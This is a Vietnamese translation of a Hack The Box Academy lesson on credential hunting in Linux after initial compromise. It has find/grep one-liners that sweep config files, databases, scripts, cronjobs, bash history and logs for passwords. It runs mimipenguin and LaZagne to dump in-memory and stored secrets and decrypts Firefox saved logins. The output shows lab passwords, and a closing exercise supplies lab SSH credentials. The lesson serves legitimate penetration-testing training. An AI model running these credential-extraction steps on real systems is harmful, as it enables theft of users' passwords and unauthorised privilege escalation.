# Săn tìm Credential trên Linux (Credential Hunting in Linux)

*Nguồn: Hack The Box Academy — Module "Credential Hunting in Linux" (Section 17/26)*

Việc săn tìm credential (thông tin đăng nhập) là một trong những bước đầu tiên cần làm ngay khi ta đã có quyền truy cập vào hệ thống. Những "quả ngọt dễ hái" (low-hanging fruits) này có thể giúp ta leo thang đặc quyền chỉ trong vài giây hoặc vài phút. Đây là một phần của quy trình leo thang đặc quyền cục bộ (local privilege escalation) mà chúng ta sẽ tìm hiểu ở đây. Tuy nhiên, cần lưu ý rằng nội dung này còn lâu mới bao quát hết mọi tình huống có thể xảy ra, nên trọng tâm sẽ là các cách tiếp cận khác nhau.

Hãy hình dung ta đã khai thác thành công một ứng dụng web dễ bị tấn công và có được một reverse shell, chẳng hạn. Để leo thang đặc quyền hiệu quả nhất, ta có thể tìm kiếm mật khẩu hoặc thậm chí toàn bộ bộ credential để đăng nhập vào mục tiêu. Có nhiều nguồn có thể cung cấp credential, được chia thành bốn nhóm chính, bao gồm nhưng không giới hạn ở:

- **Files (Tệp tin)** — bao gồm file cấu hình, cơ sở dữ liệu, ghi chú, script, mã nguồn, cronjob và SSH key
- **History (Lịch sử)** — bao gồm log và lịch sử dòng lệnh (command-line history)
- **Memory (Bộ nhớ)** — bao gồm cache và dữ liệu xử lý trong bộ nhớ (in-memory)
- **Key-ring** — ví dụ như credential được lưu trong trình duyệt

Việc liệt kê (enumerate) tất cả các nhóm này sẽ giúp tăng xác suất tìm ra credential của các user có sẵn trên hệ thống một cách dễ dàng hơn. Có vô số tình huống khác nhau và ta luôn thấy các kết quả khác nhau. Vì vậy, cần điều chỉnh cách tiếp cận theo hoàn cảnh môi trường cụ thể và luôn giữ cái nhìn tổng thể. Trên hết, điều quan trọng là phải hiểu rõ cách hệ thống hoạt động, mục đích tồn tại của nó, và vai trò của nó trong logic nghiệp vụ cũng như trong toàn bộ mạng lưới. Ví dụ, nếu đó là một máy chủ cơ sở dữ liệu bị cô lập, ta sẽ không nhất thiết tìm thấy user thông thường ở đó, vì đây là một giao diện nhạy cảm trong việc quản lý dữ liệu mà chỉ một số ít người được cấp quyền truy cập.

## Files (Tệp tin)

Một nguyên tắc cốt lõi của Linux là "mọi thứ đều là file". Vì vậy, điều quan trọng là phải ghi nhớ khái niệm này và tìm kiếm, phát hiện, lọc ra các file phù hợp theo yêu cầu. Ta nên tìm kiếm và kiểm tra lần lượt các nhóm file sau:

- Configuration files (File cấu hình)
- Databases (Cơ sở dữ liệu)
- Notes (Ghi chú)
- Scripts (Kịch bản)
- Cronjobs
- SSH keys

File cấu hình là cốt lõi trong hoạt động của các dịch vụ trên các bản phân phối Linux. Chúng thường chứa credential mà ta có thể đọc được. Việc xem xét chúng cũng giúp ta hiểu chính xác cách dịch vụ hoạt động và các yêu cầu của nó. Thông thường, file cấu hình có các phần mở rộng sau: `.config`, `.conf`, `.cnf`. Tuy nhiên, các file cấu hình này (hoặc các file liên quan) có thể bị đổi tên, nghĩa là các phần mở rộng này không nhất thiết phải xuất hiện. Hơn nữa, ngay cả khi biên dịch lại một dịch vụ, tên file cấu hình cơ bản cũng có thể bị thay đổi, dẫn đến hiệu ứng tương tự. Đây là trường hợp hiếm gặp, nhưng khả năng này không nên bị bỏ qua trong quá trình tìm kiếm.

### Tìm kiếm file cấu hình

Phần quan trọng nhất của việc liệt kê hệ thống là có được cái nhìn tổng quan về nó. Vì vậy, bước đầu tiên nên là tìm tất cả các file cấu hình có thể có trên hệ thống, sau đó xem xét và phân tích từng file chi tiết hơn. Có nhiều phương pháp để tìm các file cấu hình này, và với phương pháp sau, ta sẽ thu hẹp phạm vi tìm kiếm về ba phần mở rộng file này.

```shellsession
naruto3co@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

Ngoài ra, ta có thể lưu kết quả vào một file văn bản và dùng nó để kiểm tra từng file một. Một lựa chọn khác là chạy quét trực tiếp cho từng file được tìm thấy với phần mở rộng chỉ định và xuất nội dung ra. Trong ví dụ này, ta tìm kiếm ba từ khóa (`user`, `password`, `pass`) trong mỗi file có phần mở rộng `.cnf`.

```shellsession
naruto3co@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

### Tìm kiếm cơ sở dữ liệu

Ta có thể áp dụng cách tìm kiếm đơn giản này cho các phần mở rộng file khác. Ngoài ra, ta cũng có thể áp dụng kiểu tìm kiếm này cho các cơ sở dữ liệu được lưu trong file với các phần mở rộng khác nhau, rồi đọc chúng.

```shellsession
naruto3co@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

### Tìm kiếm ghi chú (Notes)

Tùy vào môi trường và mục đích của máy chủ mà ta đang truy cập, ta thường có thể tìm thấy các ghi chú về những quy trình cụ thể trên hệ thống. Những ghi chú này thường bao gồm danh sách nhiều điểm truy cập khác nhau hoặc thậm chí cả credential của chúng. Tuy nhiên, việc tìm ra ghi chú ngay lập tức thường khá khó khăn nếu chúng được lưu ở đâu đó trên hệ thống chứ không phải trên desktop hay trong các thư mục con của nó. Lý do là chúng có thể được đặt tên bất kỳ và không nhất thiết phải có phần mở rộng cụ thể, chẳng hạn như `.txt`. Vì vậy, trong trường hợp này, ta cần tìm cả file có phần mở rộng `.txt` lẫn file không có phần mở rộng nào.

```shellsession
naruto3co@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
<SNIP>
```

### Tìm kiếm script

Script là những file thường chứa thông tin và quy trình có độ nhạy cảm cao. Trong số những thứ khác, chúng cũng chứa credential cần thiết để có thể gọi và thực thi các quy trình một cách tự động. Nếu không, quản trị viên hoặc lập trình viên sẽ phải nhập mật khẩu tương ứng mỗi khi script hoặc chương trình đã biên dịch được gọi.

```shellsession
naruto3co@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
<SNIP>
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

### Liệt kê cronjob

Cronjob là các lệnh, chương trình, script được thực thi độc lập. Chúng được chia thành khu vực toàn hệ thống (`/etc/crontab`) và các tác vụ thực thi phụ thuộc vào user. Một số ứng dụng và script yêu cầu credential để chạy, và vì vậy chúng thường bị nhập sai (vô tình để lộ) trong các cronjob. Ngoài ra còn có các khu vực được chia theo khoảng thời gian khác nhau (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). Các script và file được `cron` sử dụng cũng có thể được tìm thấy trong `/etc/cron.d/` đối với các bản phân phối dựa trên Debian.

```shellsession
naruto3co@htb[/htb]$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly

naruto3co@htb[/htb]$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x  1 root root  106 3. Jan 20:27 .
drwxr-xr-x  1 root root 5728 1. Feb 00:06 ..
-rw-r--r--  1 root root  201 1. Mär 2021 e2scrub_all
-rw-r--r--  1 root root  331 9. Jan 2021 geoipupdate
-rw-r--r--  1 root root  607 25. Jan 2021 john
-rw-r--r--  1 root root  589 14. Sep 2020 mdadm
-rw-r--r--  1 root root  712 11. Mai 2020 php
-rw-r--r--  1 root root  102 22. Feb 2021 .placeholder
-rw-r--r--  1 root root  396 2. Feb 2021 sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x  1 root root  252 6. Jan 16:24 .
drwxr-xr-x  1 root root 5728 1. Feb 00:06 ..
<SNIP>
```

## History (Lịch sử)

### Liệt kê file lịch sử

Tất cả các file lịch sử cung cấp thông tin quan trọng về diễn biến hiện tại và trước đây/trong quá khứ của các quy trình. Ta quan tâm đến các file lưu lịch sử lệnh của user cũng như các log lưu thông tin về quy trình hệ thống.

Trong lịch sử các lệnh được nhập trên các bản phân phối Linux dùng Bash làm shell mặc định, ta tìm thấy các file liên quan trong `.bash_history`. Ngoài ra, các file khác như `.bashrc` hoặc `.bash_profile` cũng có thể chứa thông tin quan trọng.

```shellsession
naruto3co@htb[/htb]$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
   . /usr/share/bash-completion/bash_completion
elif [ -f /etc/bash_completion ]; then
   . /etc/bash_completion
  fi
fi
```

### Liệt kê file log

Một khái niệm quan trọng của hệ thống Linux là các file log được lưu dưới dạng file văn bản. Nhiều chương trình, đặc biệt là tất cả các dịch vụ và bản thân hệ thống, đều ghi ra các file như vậy. Trong đó, ta có thể tìm thấy lỗi hệ thống, phát hiện vấn đề liên quan đến dịch vụ, hoặc theo dõi những gì hệ thống đang làm ở chế độ nền. Toàn bộ các file log có thể được chia thành bốn nhóm:

- Application logs (Log ứng dụng)
- Event logs (Log sự kiện)
- Service logs (Log dịch vụ)
- System logs (Log hệ thống)

Có rất nhiều loại log khác nhau tồn tại trên hệ thống, tùy thuộc vào các ứng dụng được cài đặt, nhưng dưới đây là một số log quan trọng nhất:

| File | Mô tả |
|---|---|
| `/var/log/messages` | Log hoạt động chung của hệ thống. |
| `/var/log/syslog` | Log hoạt động chung của hệ thống. |
| `/var/log/auth.log` (Debian) | Toàn bộ log liên quan đến xác thực. |
| `/var/log/secure` (RedHat/CentOS) | Toàn bộ log liên quan đến xác thực. |
| `/var/log/boot.log` | Thông tin khởi động. |
| `/var/log/dmesg` | Thông tin và log liên quan đến phần cứng, driver. |
| `/var/log/kern.log` | Cảnh báo, lỗi và log liên quan đến kernel. |
| `/var/log/faillog` | Các lần đăng nhập thất bại. |
| `/var/log/cron` | Thông tin liên quan đến cronjob. |
| `/var/log/mail.log` | Toàn bộ log liên quan đến mail server. |
| `/var/log/httpd` | Toàn bộ log liên quan đến Apache. |
| `/var/log/mysqld.log` | Toàn bộ log liên quan đến MySQL server. |

Việc phân tích chi tiết các file log này trong trường hợp này sẽ không hiệu quả. Vì vậy, ở bước này, ta nên làm quen với từng loại log riêng lẻ, trước tiên xem xét thủ công và hiểu định dạng của chúng. Tuy nhiên, dưới đây là một số chuỗi ta có thể dùng để tìm nội dung đáng chú ý trong log:

```shellsession
naruto3co@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1
<SNIP>
```

## Memory and cache (Bộ nhớ và cache)

### Mimipenguin
https://github.com/huntergregal/mimipenguin

Nhiều ứng dụng và tiến trình làm việc với credential cần thiết cho việc xác thực và lưu chúng lại — trong bộ nhớ hoặc trong file — để có thể tái sử dụng. Ví dụ, đó có thể là credential mà hệ thống yêu cầu cho các user đang đăng nhập. Một ví dụ khác là credential được lưu trong trình duyệt, cũng có thể đọc được. Để lấy loại thông tin này từ các bản phân phối Linux, có một công cụ tên là **mimipenguin** giúp toàn bộ quá trình này trở nên dễ dàng hơn. Tuy nhiên, công cụ này yêu cầu quyền quản trị/root.

```shellsession
naruto3co@htb[/htb]$ sudo python3 mimipenguin.py

[SYSTEM - GNOME]        cry0l1t3:WLpAEXFa0SbqOHY
```

### LaZagne
https://github.com/alessandroz/lazagne

Một công cụ mạnh mẽ hơn nữa mà ta có thể sử dụng, đã được đề cập trước đó trong phần Credential Hunting in Windows, là **LaZagne**. Công cụ này cho phép ta truy cập vào nhiều nguồn tài nguyên hơn và trích xuất credential. Mật khẩu và hash mà ta có thể lấy được đến từ các nguồn sau, nhưng không giới hạn ở:

- Wifi
- Wpa_supplicant
- Libsecret
- Kwallet
- Chromium-based
- CLI
- Mozilla
- Thunderbird
- Git
- ENV variables
- Grub
- Fstab
- AWS
- Filezilla
- Gftp
- SSH
- Apache
- Shadow
- Docker
- Keepass
- Mimipy
- Sessions
- Keyrings

Ví dụ, **Keyrings** được dùng để lưu trữ và quản lý mật khẩu an toàn trên các bản phân phối Linux. Mật khẩu được lưu ở dạng mã hóa và được bảo vệ bằng một mật khẩu chủ (master password). Đây là một trình quản lý mật khẩu dựa trên hệ điều hành, mà ta sẽ bàn tới ở phần khác sau này. Nhờ vậy, ta không cần phải nhớ từng mật khẩu riêng lẻ và có thể lưu lại các mục mật khẩu lặp lại.

```shellsession
naruto3co@htb[/htb]$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                        |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY

[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

## Key-rings (Credential trình duyệt)

### Browser credentials (Credential trình duyệt)

Trình duyệt lưu lại mật khẩu mà user đã lưu ở dạng mã hóa cục bộ trên hệ thống để có thể tái sử dụng. Ví dụ, trình duyệt **Mozilla Firefox** lưu credential đã mã hóa trong một thư mục ẩn dành riêng cho từng user. Những thông tin này thường bao gồm cả tên trường liên quan, URL và các thông tin giá trị khác.
https://github.com/unode/firefox_decrypt

Ví dụ, khi ta lưu credential cho một trang web trong trình duyệt Firefox, chúng được mã hóa và lưu trong file `logins.json` trên hệ thống. Tuy nhiên, điều này không có nghĩa là chúng an toàn ở đó. Nhiều nhân viên lưu dữ liệu đăng nhập kiểu này trong trình duyệt mà không ngờ rằng nó có thể dễ dàng bị giải mã và sử dụng để chống lại chính công ty.

```shellsession
[!bash]$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shellsession
naruto3co@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

Công cụ **Firefox Decrypt** rất phù hợp để giải mã các credential này, và được cập nhật thường xuyên. Nó yêu cầu Python 3.9 để chạy phiên bản mới nhất. Nếu không, phải dùng **Firefox Decrypt 0.7.0** với Python 2.

```shellsession
naruto3co@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Ngoài ra, **LaZagne** cũng có thể trả về kết quả nếu user đã sử dụng trình duyệt được hỗ trợ.

```shellsession
naruto3co@htb[/htb]$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                        |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh

[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```

---

## Kết nối tới HTB

**Mục tiêu:** Spawn target system để lấy IP và trả lời câu hỏi.

> ⚠️ Trả lời câu hỏi bằng tiếng Anh để đảm bảo phản hồi chính xác.

**Câu hỏi 1 (+40 XP):**
Kiểm tra mục tiêu và tìm ra mật khẩu của user Will. Sau đó, nộp mật khẩu đó làm đáp án.

> Gợi ý: SSH tới mục tiêu với user `kira` và mật khẩu `L0vey0u1!`

*(17/26 phần)*
